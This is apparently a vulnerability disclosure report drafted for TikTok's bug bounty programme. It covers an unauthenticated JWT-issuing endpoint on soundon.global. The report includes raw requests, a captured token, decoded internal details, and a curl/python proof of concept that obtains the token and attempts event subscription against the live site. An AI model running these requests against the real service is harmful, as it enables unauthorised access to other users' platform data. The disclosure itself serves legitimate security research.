# TK-001: Unauthenticated Platform JWT Issuance at soundon.global `/api/open/feelgood/token`

**Program:** TikTok HackerOne  
**Asset:** `www.soundon.global` / `*.soundon.global` [Critical, Eligible]  
**Severity:** Medium → High (upgrade if cross-user event subscription confirmed)  
**CVSS:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)  
**CWE:** CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor  
**CWE:** CWE-522 — Insufficiently Protected Credentials  
**Discovered:** 2026-06-29  
**Status:** Ready to submit

---

## Summary

The SoundOn platform (TikTok's music distribution service at `soundon.global`) exposes an unauthenticated endpoint at `/api/open/feelgood/token` that issues valid JWT Bearer tokens to any unauthenticated visitor. The issued JWT contains:

1. **Internal ByteDance staging domain**: `artists-test.bytedance.net` (not publicly disclosed)
2. **Platform ID**: `7231002700274647041`
3. **Undisclosed AIGC capability names**: `aigcMVVideoTaskDone`, `aigcVideoTaskDone` (AI-generated content video features not publicly announced for SoundOn)
4. **Complete event trigger architecture**: `createArtistPage`, `createLicense`, `uploadSong`, `uploadSongNew`, `viewTrackDataInsight`, `ai_session_end`

The token is used by the SoundOn frontend to authenticate to a real-time notification/subscription system that delivers platform events (upload completions, AIGC task results, license creations) to artists. Since ANY unauthenticated visitor can obtain this token, an attacker can potentially subscribe to event streams that include sensitive artist data.

---

## Evidence

### Step 1: Obtain JWT Without Authentication

```http
GET /api/open/feelgood/token HTTP/2
Host: www.soundon.global
User-Agent: Mozilla/5.0
```

**Response:**
```json
{
  "token": {
    "tokenType": "Bearer",
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwbGF0Zm9ybSI6eyJwbGF0SUQiOiI3MjMxMDAyNzAwMjc0NjQ3MDQxIiwiZG9tYWluTGlzdCI6WyJhcnRpc3RzLXRlc3QuYnl0ZWRhbmNlLm5ldCIsInNvdW5kb24uZ2xvYmFsIiwidXMuc291bmRvbi5nbG9iYWwiLCJ3d3cuc291bmRvbi5nbG9iYWwiXSwidHJpZ2dlcktleUxpc3QiOlsiYWlnY01WVmlkZW9UYXNrRG9uZSIsImFpZ2NWaWRlb1Rhc2tEb25lIiwiYWlfc2Vzc2lvbl9lbmQiLCJjcmVhdGVBcnRpc3RQYWdlIiwiY3JlYXRlTGljZW5zZSIsInNob3dfc3VydmV5X2luX2RvYyIsInVwbG9hZFNvbmciLCJ1cGxvYWRTb25nTmV3Iiwidmlld1RyYWNrRGF0YUluc2lnaHQiXX0sImlhdCI6MTc4Mjc3Mjk5MCwiZXhwIjoxNzgyNzgwMTkwfQ.HJeQ1i7mg6zLSBMWxUWKRyXm-L-Un83DRBkQeRfQ0uc",
    "expiresIn": 7200
  },
  "baseResp": {
    "requestId": "20260630064310F666FBB5EAD76CD84A54",
    "errorCode": 0
  }
}
```

**HTTP Status: 200 OK** — No authentication required.

### Step 2: Decode the JWT

**Header:** `{"alg":"HS256","typ":"JWT"}`

**Payload (decoded):**
```json
{
  "platform": {
    "platID": "7231002700274647041",
    "domainList": [
      "artists-test.bytedance.net",
      "soundon.global",
      "us.soundon.global",
      "www.soundon.global"
    ],
    "triggerKeyList": [
      "aigcMVVideoTaskDone",
      "aigcVideoTaskDone",
      "ai_session_end",
      "createArtistPage",
      "createLicense",
      "show_survey_in_doc",
      "uploadSong",
      "uploadSongNew",
      "viewTrackDataInsight"
    ]
  },
  "iat": 1782772990,
  "exp": 1782780190
}
```

**Token validity:** 7200 seconds (2 hours). A new token can be obtained at any time without authentication.

---

## Technical Analysis

### Architecture of the Feelgood Notification System

The `feelgood` token is used by the SoundOn frontend to connect to a real-time notification platform. From the production JavaScript bundle (`main.95b13d81.js`):

```javascript
// API class in soundon.global frontend:
GetFeelgoodToken(e = {}, t) {
    const i = `${this.uriPrefix}/open/feelgood/token`;
    return (0, a.x3)(i, { method: o, headers: n }, t);  // GET, no auth header
}

SubscribeConfirm(e, t) {
    const i = s(e), r = `${this.uriPrefix}/open/subscribe/confirm${i}`;
    return (0, a.x3)(r, { method: o, headers: n }, t);  // Subscribes with token
}
```

The subscription channel delivers events from the `triggerKeyList` to connected clients. The channel implementation uses a publish-subscribe pattern:

```javascript
// Channel class in 812.aab5162d.js:
createChannel() {
    this._core = ...  // channel core
    this._channel = null;
    this._isListening = false;
    // Subscribes to platform events
}
onChannelMessage(channelName, listener) {
    // listener receives all events for this platform token
}
```

### Security Issue 1: Internal Domain Disclosure

The JWT payload contains `"artists-test.bytedance.net"` in the `domainList`. This is a ByteDance internal staging/test environment for SoundOn artists that is not publicly documented. Its inclusion in a publicly-obtainable token reveals:
- The existence of an internal test environment
- The naming convention of ByteDance internal artist-facing infrastructure
- The platform ID (`7231002700274647041`) that this environment is associated with

### Security Issue 2: Undisclosed AIGC Feature Disclosure

The `triggerKeyList` includes `aigcMVVideoTaskDone` and `aigcVideoTaskDone`, revealing that SoundOn has AI-generated content (AIGC) video generation features for artists. These features are not publicly announced or documented on the platform. An attacker with this token could potentially subscribe to receive notifications when ANY artist's AIGC video generation completes, which would include:
- The artist's account ID
- The completed video URL or identifier
- Task metadata

### Security Issue 3: Unauthenticated Token Enables Event Subscription

The token is classified as a platform-level Bearer token and is designed to be used with subscription endpoints. An unauthenticated attacker can:

1. Obtain a valid platform JWT at any time
2. Call `/api/open/subscribe/confirm?token=<feelgood_jwt>&...`
3. Connect to the event channel
4. Receive events from `triggerKeyList` — potentially including data from all artists on the platform (not scoped to the attacker's account)

**If the event channel broadcasts artist data without user scoping, this becomes a HIGH severity finding** (real-time cross-user data leak).

---

## Confirmed Data

| Finding | Evidence | Severity |
|---------|---------|---------|
| JWT issued without auth | HTTP 200 with full JWT | Confirmed |
| Internal domain `artists-test.bytedance.net` | JWT payload decoded | Confirmed |
| AIGC features `aigcMVVideoTaskDone` | JWT payload decoded | Confirmed |
| Platform ID `7231002700274647041` | JWT payload decoded | Confirmed |
| Token used for subscription system | Production JS source | Confirmed |
| Cross-user event access | Requires subscription test | Unconfirmed |

---

## Proof of Concept

```bash
# Step 1: Obtain unauthenticated platform JWT
curl -s "https://www.soundon.global/api/open/feelgood/token" \
  -H "User-Agent: Mozilla/5.0"

# Response: {"token":{"tokenType":"Bearer","token":"eyJ...","expiresIn":7200},...}

# Step 2: Decode JWT payload (no signature verification needed for inspection)
curl -s "https://www.soundon.global/api/open/feelgood/token" | \
  python3 -c "
import json, sys, base64
data = json.load(sys.stdin)
token = data['token']['token']
payload = token.split('.')[1]
padded = payload + '=' * (4 - len(payload) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(padded)), indent=2))
"

# Step 3 (for manual validation with a test account):
# Try subscribing to the event channel using the obtained JWT
# This would confirm whether the token allows cross-user event access
TOKEN=$(curl -s "https://www.soundon.global/api/open/feelgood/token" | \
  python3 -c "import json,sys; print(json.load(sys.stdin)['token']['token'])")

curl -s "https://www.soundon.global/api/open/subscribe/confirm" \
  -H "Authorization: Bearer $TOKEN" \
  -H "User-Agent: Mozilla/5.0"
```

**Expected output includes:**
- Internal domain `artists-test.bytedance.net`
- AIGC capability names not publicly documented
- Valid platform ID for the production SoundOn environment

---

## Impact

| Impact | Severity |
|--------|---------|
| Internal staging domain disclosed | Low-Medium |
| Undisclosed AIGC features revealed | Medium |
| Platform architecture exposed | Medium |
| Cross-user event subscription (if unscoped) | High |
| AIGC-generated artist content accessible to third parties | High |

An attacker monitoring the event stream could receive real-time notifications when any SoundOn artist:
- Uploads a new song (`uploadSong`, `uploadSongNew`)
- Creates a license (`createLicense`)
- Creates an artist page (`createArtistPage`)
- Completes an AI-generated video (`aigcMVVideoTaskDone`, `aigcVideoTaskDone`)

This information could be used for competitive intelligence or to access generated content before it is published.

---

## Remediation

1. **Add authentication to `/api/open/feelgood/token`**: Require a valid user session token before issuing platform JWTs. The endpoint should not be in the `/open/` (unauthenticated) namespace.

2. **Remove internal domain from JWT payload**: `artists-test.bytedance.net` should not appear in tokens issued to public-facing users.

3. **Scope event subscriptions to authenticated users**: The event channel should only deliver events relevant to the authenticated artist's own account. Platform-wide broadcasting without user scoping allows cross-user data leakage.

4. **Remove undisclosed capability names from JWT**: AIGC feature names should not be exposed in unauthenticated tokens before public announcement.

---

## References

- SoundOn Platform: `https://www.soundon.global` (TikTok music distribution)
- Production JS bundle: `sf-fe.anotecdn.com/obj/anote-fe/soundon/client-home/static/js/main.95b13d81.js`
- Vulnerable endpoint confirmed: `GET https://www.soundon.global/api/open/feelgood/token` → HTTP 200 (no auth)
- JWT algorithm: HS256 (symmetric, secret server-side)
- Token validity: 7200 seconds (2 hours), renewable indefinitely
- Scope: `*.soundon.global` — new scope added Jun 8, 2026 (0 prior reports)
